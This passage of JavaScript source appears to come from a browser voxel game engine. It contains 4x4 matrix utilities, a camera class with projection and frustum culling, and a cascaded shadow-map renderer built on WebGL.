    unscale(x,y,z){
      let a = this.elements
			a[0] /= x;
			a[1] /= y;
			a[2] /= z;
			a[4] /= x;
			a[5] /= y;
			a[6] /= z;
			a[8] /= x;
			a[9] /= y;
			a[10] /= z;
			a[12] /= x;
			a[13] /= y;
			a[14] /= z;
    }
		invert(){//from https://stackoverflow.com/questions/1148309/inverting-a-4x4-matrix
			let m = this.elements
			let inv0 = m[5]  * m[10] * m[15] - 
				m[5]  * m[11] * m[14] - 
				m[9]  * m[6]  * m[15] + 
				m[9]  * m[7]  * m[14] +
				m[13] * m[6]  * m[11] - 
				m[13] * m[7]  * m[10];
			let inv4 = -m[4]  * m[10] * m[15] + 
				m[4]  * m[11] * m[14] + 
				m[8]  * m[6]  * m[15] - 
				m[8]  * m[7]  * m[14] - 
				m[12] * m[6]  * m[11] + 
				m[12] * m[7]  * m[10];
			let inv8 = m[4]  * m[9] * m[15] - 
				m[4]  * m[11] * m[13] - 
				m[8]  * m[5] * m[15] + 
				m[8]  * m[7] * m[13] + 
				m[12] * m[5] * m[11] - 
				m[12] * m[7] * m[9];
			let inv12 = -m[4]  * m[9] * m[14] + 
				m[4]  * m[10] * m[13] +
				m[8]  * m[5] * m[14] - 
				m[8]  * m[6] * m[13] - 
				m[12] * m[5] * m[10] + 
				m[12] * m[6] * m[9];
			let inv1 = -m[1]  * m[10] * m[15] + 
				m[1]  * m[11] * m[14] + 
				m[9]  * m[2] * m[15] - 
				m[9]  * m[3] * m[14] - 
				m[13] * m[2] * m[11] + 
				m[13] * m[3] * m[10];
			let inv5 = m[0]  * m[10] * m[15] - 
				m[0]  * m[11] * m[14] - 
				m[8]  * m[2] * m[15] + 
				m[8]  * m[3] * m[14] + 
				m[12] * m[2] * m[11] - 
				m[12] * m[3] * m[10];
			let inv9 = -m[0]  * m[9] * m[15] + 
				m[0]  * m[11] * m[13] + 
				m[8]  * m[1] * m[15] - 
				m[8]  * m[3] * m[13] - 
				m[12] * m[1] * m[11] + 
				m[12] * m[3] * m[9];
			let inv13 = m[0]  * m[9] * m[14] - 
				m[0]  * m[10] * m[13] - 
				m[8]  * m[1] * m[14] + 
				m[8]  * m[2] * m[13] + 
				m[12] * m[1] * m[10] - 
				m[12] * m[2] * m[9];
			let inv2 = m[1]  * m[6] * m[15] - 
				m[1]  * m[7] * m[14] - 
				m[5]  * m[2] * m[15] + 
				m[5]  * m[3] * m[14] + 
				m[13] * m[2] * m[7] - 
				m[13] * m[3] * m[6];
			let inv6 = -m[0]  * m[6] * m[15] + 
				m[0]  * m[7] * m[14] + 
				m[4]  * m[2] * m[15] - 
				m[4]  * m[3] * m[14] - 
				m[12] * m[2] * m[7] + 
				m[12] * m[3] * m[6];
			let inv10 = m[0]  * m[5] * m[15] - 
				m[0]  * m[7] * m[13] - 
				m[4]  * m[1] * m[15] + 
				m[4]  * m[3] * m[13] + 
				m[12] * m[1] * m[7] - 
				m[12] * m[3] * m[5];
			let inv14 = -m[0]  * m[5] * m[14] + 
				m[0]  * m[6] * m[13] + 
				m[4]  * m[1] * m[14] - 
				m[4]  * m[2] * m[13] - 
				m[12] * m[1] * m[6] + 
				m[12] * m[2] * m[5];
			let inv3 = -m[1] * m[6] * m[11] + 
				m[1] * m[7] * m[10] + 
				m[5] * m[2] * m[11] - 
				m[5] * m[3] * m[10] - 
				m[9] * m[2] * m[7] + 
				m[9] * m[3] * m[6];
			let inv7 = m[0] * m[6] * m[11] - 
				m[0] * m[7] * m[10] - 
				m[4] * m[2] * m[11] + 
				m[4] * m[3] * m[10] + 
				m[8] * m[2] * m[7] - 
				m[8] * m[3] * m[6];
			let inv11 = -m[0] * m[5] * m[11] + 
				m[0] * m[7] * m[9] + 
				m[4] * m[1] * m[11] - 
				m[4] * m[3] * m[9] - 
				m[8] * m[1] * m[7] + 
				m[8] * m[3] * m[5];
			let inv15 = m[0] * m[5] * m[10] - 
				m[0] * m[6] * m[9] - 
				m[4] * m[1] * m[10] + 
				m[4] * m[2] * m[9] + 
				m[8] * m[1] * m[6] - 
				m[8] * m[2] * m[5];
			//what is a determinant?????????
			let det = 1/(m[0] * inv0 + m[1] * inv4 + m[2] * inv8 + m[3] * inv12);
			m[0] = inv0*det
			m[1] = inv1*det
			m[2] = inv2*det
			m[3] = inv3*det
			m[4] = inv4*det
			m[5] = inv5*det
			m[6] = inv6*det
			m[7] = inv7*det
			m[8] = inv8*det
			m[9] = inv9*det
			m[10] = inv10*det
			m[11] = inv11*det
			m[12] = inv12*det
			m[13] = inv13*det
			m[14] = inv14*det
			m[15] = inv15*det
		}
    /*wobble(time,amount){ //doesn't work
      let c = cos(sin(time/500)/4)
			let s = sin(sin(time/500)/4)
			let elems = this.elements
			let t = elems[0]
			elems[0] = t * c + elems[1] * -s
			elems[1] = t * s + elems[1] * -c
			t = elems[4]
			elems[4] = t * c + elems[5] * s
			elems[5] = t * +s + elems[5] * c
			t = elems[8]
			elems[8] = t * c + elems[9] * -s
			elems[9] = t * s + elems[9] * -c
			t = elems[12]
			elems[12] = t * c + elems[13] * s
			elems[13] = t * +s + elems[13] * c
    }*/
		identity() {
			let a = this.elements
			a[0] = 1
			a[1] = 0
			a[2] = 0
			a[3] = 0
			a[4] = 0
			a[5] = 1
			a[6] = 0
			a[7] = 0
			a[8] = 0
			a[9] = 0
			a[10] = 1
			a[11] = 0
			a[12] = 0
			a[13] = 0
			a[14] = 0
			a[15] = 1
		}
		// somebody optimize this
		// you just have to expand it
		mult(b) {
			const a = this.elements.slice()
			const out = this.elements
			let e = 0
			for (let row = 0; row < 4; row++) {
				for (let col = 0; col < 4; col++) {
					out[e++] = a[row * 4 + 0] * b[col + 0] + a[row * 4 + 1] * b[col + 4] + a[row * 4 + 2] * b[col + 8] + a[row * 4 + 3] * b[col + 12];
				}
			}
		}
		// same here
		postMult(a) {
			const b = this.elements.slice()
			const out = this.elements
			let e = 0
			for (let row = 0; row < 4; row++) {
				for (let col = 0; col < 4; col++) {
					out[e++] = a[row * 4 + 0] * b[col + 0] + a[row * 4 + 1] * b[col + 4] + a[row * 4 + 2] * b[col + 8] + a[row * 4 + 3] * b[col + 12];
				}
			}
		}
		transpose() {
			let matrix = this.elements
			let temp = matrix[4]
			matrix[4] = matrix[1]
			matrix[1] = temp

			temp = matrix[8]
			matrix[8] = matrix[2]
			matrix[2] = temp

			temp = matrix[6]
			matrix[6] = matrix[9]
			matrix[9] = temp

			temp = matrix[3]
			matrix[3] = matrix[12]
			matrix[12] = temp

			temp = matrix[7]
			matrix[7] = matrix[13]
			matrix[13] = temp

			temp = matrix[11]
			matrix[11] = matrix[14]
			matrix[14] = temp
		}
		/*copyArray(from) {
			let to = this.elements
			for (let i = 0; i < from.length; i++) {
				to[i] = from[i]
			}
		}
		copyMatrix(from) {
			let to = this.elements
			from = from.elements
			for (let i = 0; i < from.length; i++) {
				to[i] = from[i]
			}
		}*/
    set(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p) {
      let to = this.elements
      let from = arguments
      for (let i = 0; i < from.length; i++) {
				to[i] = from[i]
			}
    }
	}
  win.Matrix = Matrix

	class Plane {
		constructor(nx, ny, nz) {
			this.set(nx, ny, nz)
		}
		set(nx, ny, nz) {
			// Pre-computed chunk offsets to reduce branching during culling
			this.dx = nx > 0 ? 16 : 0
			this.dy = ny > 0
			this.dz = nz > 0 ? 16 : 0

			// Normal vector for the plane
			this.nx = nx
			this.ny = ny
			this.nz = nz
		}
		setOffset(d){
			this.ox = -this.nx*d//this.dx ? d : -d
			this.oy = -this.ny*d//this.dy ? d : -d
			this.oz = -this.nz*d//this.dz ? d : -d
		}
	}

	class Camera {
		constructor() {
			this.x = 0
			this.y = 0
			this.z = 0
      this.previousX = 0
			this.previousY = 0
			this.previousZ = 0
			this.renderX = 0
			this.renderY = 0
			this.renderZ = 0
      
			this.rx = 0; // Pitch
			this.ry = 0; // Yaw
      this.prx = 0
      this.pry = 0
			this.damagerz = 0
			this.pDamagerz = 0
			this.damagerx = 0
			this.pDamagerx = 0
			this.viewBobRz = 0
			this.pViewBobRz = 0
			this.viewBobRx = 0
			this.pViewBobRx = 0

			this.currentFov = 0
			this.defaultFov = settings.fov
			this.targetFov = settings.fov
			this.step = 0
			this.lastStep = 0
			this.scale = 1
			this.projection = new Float32Array(5)
			this.transformation = new Matrix()
			this.direction = { x: 1, y: 0, z: 0 }; // Normalized direction vector
			this.frustum = [] // The 5 planes of the viewing frustum (there's no far plane)
			for (let i = 0; i < 5; i++) {
				this.frustum.push(new Plane(1, 0, 0))
			}
			this.matrix = new Float32Array(16)
		}
		FOV(fov, time) {
			if (fov === this.currentFov) return

			if (!fov) {
				let now = Date.now()
				fov = this.currentFov + this.step * (now - this.lastStep)
				this.lastStep = now
				if (Math.sign(this.targetFov - this.currentFov) !== Math.sign(this.targetFov - fov)) {
					fov = this.targetFov
				}
			}
			else if (time) {
				this.targetFov = fov
				this.step = (fov - this.currentFov) / time
				this.lastStep = Date.now()
				return
			} else {
				this.targetFov = fov
			}

			const tang = Math.tan(fov * Math.PI / 360)
			const scale = 1 / tang
			const near = 1
			const far = 1000000
			this.currentFov = fov; // Store the state of the projection matrix
			this.nearH = near * tang; // This is needed for frustum culling

			this.projection[0] = scale / width * height
			this.projection[1] = scale
			this.projection[2] = -far / (far - near)
			this.projection[3] = -1
			this.projection[4] = -far * near / (far - near)
		}
		transform() {
      let diff = (now - this.p.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let x = (this.x - this.previousX) * diff + this.previousX
			let y = (this.y - this.previousY) * diff + this.previousY
			let z = (this.z - this.previousZ) * diff + this.previousZ
			this.renderX = x, this.renderY = y, this.renderZ = z
			//The things below are basically the same as copying from defaultModelView
			//But with p.scale included
			this.transformation.elements[0] = this.transformation.elements[10] = -10/this.p.scale
			this.transformation.elements[1] = this.transformation.elements[2] = this.transformation.elements[3] = this.transformation.elements[4] = 0
			this.transformation.elements[5] = 10/this.p.scale
			this.transformation.elements[6] = this.transformation.elements[7] = this.transformation.elements[8] = this.transformation.elements[9] = 0
			this.transformation.elements[11] = this.transformation.elements[12] = this.transformation.elements[13] = this.transformation.elements[14] = 0
			this.transformation.elements[15] = 1
      this.transformation.rotZ(lerp(diff,this.pDamagerz+this.pViewBobRz,this.damagerz+this.viewBobRz))
			this.transformation.rotX(lerp(diff,this.prx+this.pDamagerx+this.pViewBobRx,this.rx+this.damagerx+this.viewBobRx))
      if(this.p.dieRotate && !this.p.thirdPerson){
        this.transformation.translate(0,-this.p.height/2,0)
        this.transformation.rotZ(-this.p.dieRotate)
        this.transformation.translate(0,this.p.height/2,0)
      }
			this.transformation.rotY(lerp(diff,this.pry,this.ry))
			this.transformation.translate(-x, -y, -z)
		}
		getMatrix() {
			let proj = this.projection
			let view = this.transformation.elements
			let {matrix} = this
			matrix[0]  = proj[0] * view[0]
			matrix[1]  = proj[1] * view[4]
			matrix[2]  = proj[2] * view[8] + proj[3] * view[12]
			matrix[3]  = proj[4] * view[8]
			matrix[4]  = proj[0] * view[1]
			matrix[5]  = proj[1] * view[5]
			matrix[6]  = proj[2] * view[9] + proj[3] * view[13]
			matrix[7]  = proj[4] * view[9]
			matrix[8]  = proj[0] * view[2]
			matrix[9]  = proj[1] * view[6]
			matrix[10] = proj[2] * view[10] + proj[3] * view[14]
			matrix[11] = proj[4] * view[10]
			matrix[12] = proj[0] * view[3]
			matrix[13] = proj[1] * view[7]
			matrix[14] = proj[2] * view[11] + proj[3] * view[15]
			matrix[15] = proj[4] * view[11]
			return matrix
		}
    calculateDirection(){
      let diff = (now - this.p.lastUpdate) / tickTime
			if (diff > 1) diff = 1
      let rx = lerp(diff,this.prx,this.rx)
      let ry = lerp(diff,this.pry,this.ry)
			this.direction.x = -sin(ry) * cos(rx)
			this.direction.y = sin(rx)
			this.direction.z = cos(ry) * cos(rx)
    }
		setDirection() {
			if (this.targetFov !== this.currentFov) {
				this.FOV()
			}
      this.calculateDirection()
			this.computeFrustum()
		}
		computeFrustum() {
			let X = vec1
			let dir = this.direction
			X.x = dir.z
			X.y = 0
			X.z = -dir.x
			X.normalize()

			let Y = vec2
			Y.set(dir)
			Y.mult(-1)
			cross(Y, X, Y)

			//Near plane
			this.frustum[0].set(dir.x, dir.y, dir.z)

			let aux = vec3
			aux.set(Y)
			aux.mult(this.nearH)
			aux.add(dir)
			aux.normalize()
			cross(aux, X, aux)
			this.frustum[1].set(aux.x, aux.y, aux.z)

			aux.set(Y)
			aux.mult(-this.nearH)
			aux.add(dir)
			aux.normalize()
			cross(X, aux, aux)
			this.frustum[2].set(aux.x, aux.y, aux.z)

			aux.set(X)
			aux.mult(-this.nearH * width / height)
			aux.add(dir)
			aux.normalize()
			cross(aux, Y, aux)
			this.frustum[3].set(aux.x, aux.y, aux.z)

			aux.set(X)
			aux.mult(this.nearH * width / height)
			aux.add(dir)
			aux.normalize()
			cross(Y, aux, aux)
			this.frustum[4].set(aux.x, aux.y, aux.z)
		}
		canSee(x, y, z, maxY) {
			x -= 0.5
			y -= 0.5
			z -= 0.5
			maxY += 0.5
			let px = 0, py = 0, pz = 0, plane = null
			let cx = this.x, cy = this.y, cz = this.z
			for (let i = 0; i < 5; i++) {
				plane = this.frustum[i]
				px = x + plane.dx
				py = plane.dy ? maxY : y
				pz = z + plane.dz
				if ((px - cx) * plane.nx + (py - cy) * plane.ny + (pz - cz) * plane.nz < 0) {
					return false
				}
			}
			return true
		}
    canSeeEntity(x,y,z,w,h,d){
      x -= w/2
			y -= h/2
			z -= d/2
			let X = x+w, Y = y+h, Z = z+d
			let px = 0, py = 0, pz = 0, plane = null
			let cx = this.x, cy = this.y, cz = this.z
			for (let i = 0; i < 5; i++) {
				plane = this.frustum[i]
				px = plane.dx ? X : x
				py = plane.dy ? Y : y
				pz = plane.dz ? Z : z
				if ((px - cx) * plane.nx + (py - cy) * plane.ny + (pz - cz) * plane.nz < 0) {
					return false
				}
			}
			return true
    }
	}

	function trans(matrix, x, y, z) {
		let a = matrix
		a[3] += a[0] * x + a[1] * y + a[2] * z
		a[7] += a[4] * x + a[5] * y + a[6] * z
		a[11] += a[8] * x + a[9] * y + a[10] * z
		a[15] += a[12] * x + a[13] * y + a[14] * z
	}
	function rotX(matrix, angle) {
		// This function is basically multiplying 2 4x4 matrices together,
		// but 1 of them has a bunch of 0's and 1's in it,
		// so I removed all terms that multiplied by 0, and just left off the 1's.
		// mat2 = [1, 0, 0, 0, 0, c, -s, 0, 0, s, c, 0, 0, 0, 0, 1]
		let elems = matrix
		let c = cos(angle)
		let s = sin(angle)
		let t = elems[1]
		elems[1] = t * c + elems[2] * s
		elems[2] = t * -s + elems[2] * c
		t = elems[5]
		elems[5] = t * c + elems[6] * s
		elems[6] = t * -s + elems[6] * c
		t = elems[9]
		elems[9] = t * c + elems[10] * s
		elems[10] = t * -s + elems[10] * c
		t = elems[13]
		elems[13] = t * c + elems[14] * s
		elems[14] = t * -s + elems[14] * c
	}
	function rotY(matrix, angle) {
	//source = c, 0, s, 0, 0, 1, 0, 0, -s, 0, c, 0, 0, 0, 0, 1
		let c = cos(angle)
		let s = sin(angle)
		let elems = matrix
		let t = elems[0]
		elems[0] = t * c + elems[2] * -s
		elems[2] = t * s + elems[2] * c
		t = elems[4]
		elems[4] = t * c + elems[6] * -s
		elems[6] = t * s + elems[6] * c
		t = elems[8]
		elems[8] = t * c + elems[10] * -s
		elems[10] = t * s + elems[10] * c
		t = elems[12]
		elems[12] = t * c + elems[14] * -s
		elems[14] = t * s + elems[14] * c
	}
  function scale(a,x,y,z){
    a[0] *= x;
    a[1] *= y;
    a[2] *= z;
    a[4] *= x;
    a[5] *= y;
    a[6] *= z;
    a[8] *= x;
    a[9] *= y;
    a[10] *= z;
    a[12] *= x;
    a[13] *= y;
    a[14] *= z;
  }
	function transpose(matrix) {
		let temp = matrix[4]
		matrix[4] = matrix[1]
		matrix[1] = temp

		temp = matrix[8]
		matrix[8] = matrix[2]
		matrix[2] = temp

		temp = matrix[6]
		matrix[6] = matrix[9]
		matrix[9] = temp

		temp = matrix[3]
		matrix[3] = matrix[12]
		matrix[12] = temp

		temp = matrix[7]
		matrix[7] = matrix[13]
		matrix[13] = temp

		temp = matrix[11]
		matrix[11] = matrix[14]
		matrix[14] = temp
	}
	function matMult() {
	//Multiply the projection matrix by the view matrix; this is optimized specifically for these matrices by removing terms that are always 0.
		let proj = projection
		let view = modelView
		matrix[0] = proj[0] * view[0]
		matrix[1] = proj[0] * view[1]
		matrix[2] = proj[0] * view[2]
		matrix[3] = proj[0] * view[3]
		matrix[4] = proj[5] * view[4]
		matrix[5] = proj[5] * view[5]
		matrix[6] = proj[5] * view[6]
		matrix[7] = proj[5] * view[7]
		matrix[8] = proj[10] * view[8] + proj[11] * view[12]
		matrix[9] = proj[10] * view[9] + proj[11] * view[13]
		matrix[10] = proj[10] * view[10] + proj[11] * view[14]
		matrix[11] = proj[10] * view[11] + proj[11] * view[15]
		matrix[12] = proj[14] * view[8]
		matrix[13] = proj[14] * view[9]
		matrix[14] = proj[14] * view[10]
		matrix[15] = proj[14] * view[11]
	}
	function copyArr(a, b) {
		for (let i = 0; i < a.length; i++) {
			b[i] = a[i]
		}
	}
	function FOV(fov) {
		let tang = Math.tan(fov * 0.5 * Math.PI / 180)
		let scale = 1 / tang
		let near = 1
		let far = 1000000
		currentFov = fov

		projection[0] = scale / width * height
		projection[5] = scale
		projection[10] = -far / (far - near)
		projection[11] = -1
		projection[14] = -far * near / (far - near)
	}
	class CascadedShadowMapThing{
		constructor(camera){
			const cascades = 3
			this.matrices = []
			this.frustums = []
			this.viewCenters = []
			this.viewSizes = []
			for(let i=0; i<cascades; i++){
				this.matrices[i] = new Matrix()
				let frustum = [] // 4 planes, no near & far
				for (let i = 0; i < 4; i++) {
					frustum.push(new Plane(1, 0, 0))
				}
				this.frustums[i] = frustum
				this.viewCenters[i] = []
			}
			this.camera = camera
			this.tempProj = new Matrix()
			this.tempMatrix = new Matrix()
			this.tempVec1 = new PVector()
			this.tempVec2 = new PVector()
			this.tempVec3 = new PVector()
			this.tempVec4 = new PVector()
			this.tempVec5 = new PVector()
			this.tempVec6 = new PVector()
			this.tempVec7 = new PVector()
			this.tempVec8 = new PVector()
			this.tempTransformation = new Matrix()
			this.lightDirMatrix = new Matrix()
		}
		calculateSplit(near, far, lightDir, i){
			let finalMatrix = this.matrices[i]
			const {camera} = this
			let proj = this.tempProj.elements
			let arbitraryMult = 10/this.camera.p.scale//used for undoing the 10/scale in camera.transform
			/*let tang = Math.tan(Math.PI2 - camera.currentFov * Math.PI / 360)
			proj[0] = tang / width * height
			proj[5] = tang
			proj[10] = (near+far)/(near-far)
			proj[11] = -1
			proj[14] = near*far/(near-far)*2

			let view = camera.transformation.elements
			let matrix = this.tempMatrix
			let arbitraryMult2 = 1/(arbitraryMult)
			matrix.elements[0]  = proj[0] * view[0] * arbitraryMult2
			matrix.elements[1]  = proj[5] * view[4] * arbitraryMult2
			matrix.elements[2]  = proj[10] * view[8] * arbitraryMult2 + proj[11] * view[12]
			matrix.elements[3]  = proj[14] * view[8] * arbitraryMult2
			matrix.elements[4]  = proj[0] * view[1] * arbitraryMult2
			matrix.elements[5]  = proj[5] * view[5] * arbitraryMult2
			matrix.elements[6]  = proj[10] * view[9] * arbitraryMult2 + proj[11] * view[13]
			matrix.elements[7]  = proj[14] * view[9] * arbitraryMult2
			matrix.elements[8]  = proj[0] * view[2] * arbitraryMult2
			matrix.elements[9]  = proj[5] * view[6] * arbitraryMult2
			matrix.elements[10] = proj[10] * view[10] * arbitraryMult2 + proj[11] * view[14]
			matrix.elements[11] = proj[14] * view[10] * arbitraryMult2
			matrix.elements[12] = proj[0] * view[3] * arbitraryMult2
			matrix.elements[13] = proj[5] * view[7] * arbitraryMult2
			matrix.elements[14] = proj[10] * view[11] * arbitraryMult2 + proj[11] * view[15]
			matrix.elements[15] = proj[14] * view[11] * arbitraryMult2
			matrix.invert()
			corner1.set(-1,-1,-1)
			corner2.set(-1,-1,1)
			corner3.set(-1,1,-1)
			corner4.set(-1,1,1)
			corner5.set(1,-1,-1)
			corner6.set(1,-1,1)
			corner7.set(1,1,-1)
			corner8.set(1,1,1)
			vectorMultMatrix(corner1,matrix.elements)
			vectorMultMatrix(corner2,matrix.elements)
			vectorMultMatrix(corner3,matrix.elements)
			vectorMultMatrix(corner4,matrix.elements)
			vectorMultMatrix(corner5,matrix.elements)
			vectorMultMatrix(corner6,matrix.elements)
			vectorMultMatrix(corner7,matrix.elements)
			vectorMultMatrix(corner8,matrix.elements)*/
			const {tempVec1:corner1, tempVec2:corner2, tempVec3:corner3, tempVec4:corner4, tempVec5:corner5, tempVec6:corner6, tempVec7:corner7, tempVec8:corner8} = this
			const {frustum} = camera
			const sideAmount = camera.nearH
			corner1.set(frustum[0].nx-(frustum[2].nx+frustum[4].nx)*sideAmount,frustum[0].ny-(frustum[2].ny+frustum[4].ny)*sideAmount,frustum[0].nz-(frustum[2].nz+frustum[4].nz)*sideAmount), corner1.mult(near), corner1.add(camera.renderX,camera.renderY,camera.renderZ)
			corner2.set(frustum[0].nx-(frustum[2].nx+frustum[4].nx)*sideAmount,frustum[0].ny-(frustum[2].ny+frustum[4].ny)*sideAmount,frustum[0].nz-(frustum[2].nz+frustum[4].nz)*sideAmount), corner2.mult(far), corner2.add(camera.renderX,camera.renderY,camera.renderZ)
			corner3.set(frustum[0].nx-(frustum[2].nx+frustum[3].nx)*sideAmount,frustum[0].ny-(frustum[2].ny+frustum[3].ny)*sideAmount,frustum[0].nz-(frustum[2].nz+frustum[3].nz)*sideAmount), corner3.mult(near), corner3.add(camera.renderX,camera.renderY,camera.renderZ)
			corner4.set(frustum[0].nx-(frustum[2].nx+frustum[3].nx)*sideAmount,frustum[0].ny-(frustum[2].ny+frustum[3].ny)*sideAmount,frustum[0].nz-(frustum[2].nz+frustum[3].nz)*sideAmount), corner4.mult(far), corner4.add(camera.renderX,camera.renderY,camera.renderZ)
			corner5.set(frustum[0].nx-(frustum[1].nx+frustum[4].nx)*sideAmount,frustum[0].ny-(frustum[1].ny+frustum[4].ny)*sideAmount,frustum[0].nz-(frustum[1].nz+frustum[4].nz)*sideAmount), corner5.mult(near), corner5.add(camera.renderX,camera.renderY,camera.renderZ)
			corner6.set(frustum[0].nx-(frustum[1].nx+frustum[4].nx)*sideAmount,frustum[0].ny-(frustum[1].ny+frustum[4].ny)*sideAmount,frustum[0].nz-(frustum[1].nz+frustum[4].nz)*sideAmount), corner6.mult(far), corner6.add(camera.renderX,camera.renderY,camera.renderZ)
			corner7.set(frustum[0].nx-(frustum[1].nx+frustum[3].nx)*sideAmount,frustum[0].ny-(frustum[1].ny+frustum[3].ny)*sideAmount,frustum[0].nz-(frustum[1].nz+frustum[3].nz)*sideAmount), corner7.mult(near), corner7.add(camera.renderX,camera.renderY,camera.renderZ)
			corner8.set(frustum[0].nx-(frustum[1].nx+frustum[3].nx)*sideAmount,frustum[0].ny-(frustum[1].ny+frustum[3].ny)*sideAmount,frustum[0].nz-(frustum[1].nz+frustum[3].nz)*sideAmount), corner8.mult(far), corner8.add(camera.renderX,camera.renderY,camera.renderZ)
			let centerX = (corner1.x+corner2.x+corner3.x+corner4.x+corner5.x+corner6.x+corner7.x+corner8.x)/8
			let centerY = (corner1.y+corner2.y+corner3.y+corner4.y+corner5.y+corner6.y+corner7.y+corner8.y)/8
			let centerZ = (corner1.z+corner2.z+corner3.z+corner4.z+corner5.z+corner6.z+corner7.z+corner8.z)/8
//world.getEntitiesNear(p.x,p.y,p.z,"",32,nearEntityArray);if(nearEntityArray.length)nearEntityArray[0].x=nearEntityArray[0].previousX=centerX,nearEntityArray[0].y=nearEntityArray[0].previousY=centerY,nearEntityArray[0].z=nearEntityArray[0].previousZ=centerZ
/*
if(!win.loc)win.xx=corner1.x,win.yy=corner1.y,win.zz=corner1.z,win.ff=far,win.dd=dist3(corner1.x,corner1.y,corner1.z,p.x,p.y,p.z)
return//*/
			//find radius of circle that fits the frustum
			let radius = dist3(corner1.x,corner1.y,corner1.z,corner8.x,corner8.y,corner8.z)/2
			//create ortho projection
			let onear = -400, ofar = 400//if you change this, change shadow bias in getshadowmap()
			let left = radius, right = -radius
			let bottom = -radius, top = radius
			finalMatrix.identity()
			finalMatrix.elements[0] = 2/(right-left)
			finalMatrix.elements[5] = 2/(top-bottom)
			finalMatrix.elements[10] = 2/(ofar-onear)
			finalMatrix.elements[12] = (left + right) / (left - right)
			finalMatrix.elements[13] = (bottom + top) / (bottom - top)
			finalMatrix.elements[14] = (onear + ofar) / (onear - ofar)
			finalMatrix.mult(this.lightDirMatrix.elements)
			vec1.set(centerX,centerY,centerZ)
			//start texel snapping
			this.tempMatrix.elements.set(finalMatrix.elements)
			let roundScale = shadowMapSize/(radius*2)
			this.tempMatrix.scale(roundScale,roundScale,roundScale)
			this.tempMatrix.transpose()
			let tempW = vectorMultMatrixWithW(vec1,this.tempMatrix.elements)
			vec1.x = round(vec1.x)//texel size increments to prevent shadow shimmering
			vec1.y = round(vec1.y)
			vec1.z = round(vec1.z)
			this.tempMatrix.invert()
			vectorMultMatrix(vec1,this.tempMatrix.elements,tempW)
			centerX = vec1.x, centerY = vec1.y, centerZ = vec1.z
			//end texel snapping
			finalMatrix.translate(-centerX+lightDir.x*radius*2,-centerY+lightDir.y*radius*2,-centerZ+lightDir.z*radius*2)
			finalMatrix.transpose()
			this.viewCenters[i][0] = centerX
			this.viewCenters[i][1] = centerY
			this.viewCenters[i][2] = centerZ
			this.viewSizes[i] = radius
		}
		computeFrustum(i, lightDir){
			let frustum = this.frustums[i], radius = this.viewSizes[i]
			vec1.set(0,1,0), vectorMultMatrix(vec1,this.lightDirMatrix.elements)
			frustum[0].set(vec1.x,vec1.y,vec1.z), frustum[0].setOffset(radius)
			vec1.set(0,-1,0), vectorMultMatrix(vec1,this.lightDirMatrix.elements)
			frustum[1].set(vec1.x,vec1.y,vec1.z), frustum[1].setOffset(radius)
			vec1.set(1,0,0), vectorMultMatrix(vec1,this.lightDirMatrix.elements)
			frustum[2].set(vec1.x,vec1.y,vec1.z), frustum[2].setOffset(radius)
			vec1.set(-1,0,0), vectorMultMatrix(vec1,this.lightDirMatrix.elements)
			frustum[3].set(vec1.x,vec1.y,vec1.z), frustum[3].setOffset(radius)
		}
		calculate(lightDir){//call after transform
			let len = this.matrices.length
			let far = settings.renderDistance*16
			let prevFar = 1
			this.lightDirMatrix.identity()
			this.lightDirMatrix.rotX(atan2(lightDir.y, sqrt(lightDir.x*lightDir.x+lightDir.z*lightDir.z)))
			this.lightDirMatrix.rotY(atan2(-lightDir.x, lightDir.z))
			for(let i=0; i<len; i++){
				let thisFar = lerp((i+1)/len, 1,far)
				this.calculateSplit(prevFar, thisFar, lightDir, i)
				//if(!i)win.temp1=this.matrices[i]//console.log(this.matrices[i])//shh
				this.computeFrustum(i,lightDir)
				prevFar = thisFar
			}
		}
		canSee(ci, x, y, z, maxY) {
			x -= 0.5
			y -= 0.5
			z -= 0.5
			maxY += 0.5
			let px = 0, py = 0, pz = 0, plane = null
			let cx, cy, cz
			for (let i = 0; i < 4; i++) {
				plane = this.frustums[ci][i]
				;([cx,cy,cz] = this.viewCenters[ci])
				cx += plane.ox
				cy += plane.oy
				cz += plane.oz
				px = x + plane.dx
				py = plane.dy ? maxY : y
				pz = z + plane.dz
				if ((px - cx) * plane.nx + (py - cy) * plane.ny + (pz - cz) * plane.nz < 0) {
					return false
				}
			}
			/*let px = 0, py = 0, pz = 0, plane = null
			let cx,cy,cz
			for (let i = 0; i < 4; i++) {
				plane = this.frustums[ci][i]
				;([cx,cy,cz] = this.viewCenters[ci])
				cx += plane.ox
				cy += plane.oy
				cz += plane.oz
				if (
					(x - cx) * plane.nx + (y - cy) * plane.ny + (z - cz) * plane.nz < 0 &&
					(x+16 - cx) * plane.nx + (y - cy) * plane.ny + (z - cz) * plane.nz < 0 &&
					(x - cx) * plane.nx + (maxY - cy) * plane.ny + (z - cz) * plane.nz < 0 &&
					(x+16 - cx) * plane.nx + (maxY - cy) * plane.ny + (z - cz) * plane.nz < 0 &&
					(x - cx) * plane.nx + (y - cy) * plane.ny + (z+16 - cz) * plane.nz < 0 &&
					(x+16 - cx) * plane.nx + (y - cy) * plane.ny + (z+16 - cz) * plane.nz < 0 &&
					(x - cx) * plane.nx + (maxY - cy) * plane.ny + (z+16 - cz) * plane.nz < 0 &&
					(x+16 - cx) * plane.nx + (maxY - cy) * plane.ny + (z+16 - cz) * plane.nz < 0
				) return false
			}*/
			return true
		}
		render(lightDir,world){
			//if(this.eee)return;else this.eee=1
			//if(!this.pLightDir || this.pLightDir.x !== lightDir.x || this.pLightDir.y !== lightDir.y || this.pLightDir.z !== lightDir.z){
			this.calculate(lightDir)
			gl.useProgram(programShadowMap)
			gl.viewport(0,0,shadowMapSize,shadowMapSize)
      gl.colorMask(false, false, false, false)
			for(let i=0; i<this.matrices.length; i++){
				gl.uniformMatrix4fv(glCache.skylightViewShadowMap, false, this.matrices[i].elements)
				gl.uniform1i(glCache.uSamplerShadowMap, 0)
				gl.bindFramebuffer(gl.FRAMEBUFFER, shadowMapFB[i])
				gl.clear(gl.DEPTH_BUFFER_BIT)
				for(let c of world.sortedChunks){
					if(c.buffer && this.canSee(i, c.x, c.minY, c.z, c.maxY)){
						glExtensions.vertex_array_object.bindVertexArrayOES(c.vao)
						gl.drawElements(gl.TRIANGLES, 6 * c.faces, gl.UNSIGNED_INT, 0)
					}
				}
				glExtensions.vertex_array_object.bindVertexArrayOES(null)
			}
			gl.bindFramebuffer(gl.FRAMEBUFFER, null)
			gl.viewport(0, 0, resWidth, resHeight)
      gl.colorMask(true, true, true, true)
		}
		clear(){
